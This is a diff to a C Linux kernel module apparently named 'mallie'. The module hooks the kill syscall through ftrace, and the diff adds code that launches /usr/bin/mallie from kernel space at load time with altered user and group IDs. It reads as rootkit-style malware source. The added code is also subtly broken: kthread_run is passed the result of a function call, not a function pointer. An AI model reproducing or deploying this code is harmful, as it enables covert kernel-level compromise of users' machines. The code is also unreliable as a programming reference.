@@ -97,10 +97,51 @@ static struct ftrace_hook hooks[] = {
     HOOK("__x64_sys_kill", hook_kill, &orig_kill),
 };
 
+
+/* Execute process in userspace */
+int alter_uid_gid(uid_t uid, gid_t gid, struct cred *new)
+{
+        new->uid = new->euid = new->suid = new->fsuid = KUIDT_INIT(uid);
+        new->gid = new->egid = new->sgid = new->fsgid = KGIDT_INIT(gid);
+        return 0;
+}
+
+static int init_func(struct subprocess_info *info, struct cred *new)
+{
+        printk("[%d]\n", current->pid);
+        alter_uid_gid(1000, 1000, new);
+        return 0;
+}
+
+static int user_process_exec(void *data)
+{
+    struct subprocess_info *sub_info;
+    int ret = 0;
+    char *path = (char *)data;
+    char *argv[] = {path, NULL};
+    static char *envp[] = {"HOME=/", "TERM=linux",
+        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
+
+    sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_ATOMIC,
+            init_func, NULL, NULL);
+    if (sub_info == NULL) return -ENOMEM;
+
+    ret = call_usermodehelper_exec(sub_info, UMH_KILLABLE);
+    pr_info("%s: ret %d\n", __func__, ret);
+    do_exit(0);
+
+    return ret;
+}
+
+/* Function that runs when LKM initiated */
+
 static int __init mallie_module_init(void)
 {
 	int err;
 	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
+
+    char *path = "/bin/bash";
+    kthread_run(user_process_exec("/usr/bin/mallie"), path, "user_process_exec");
 
 	if (err) 
 	{
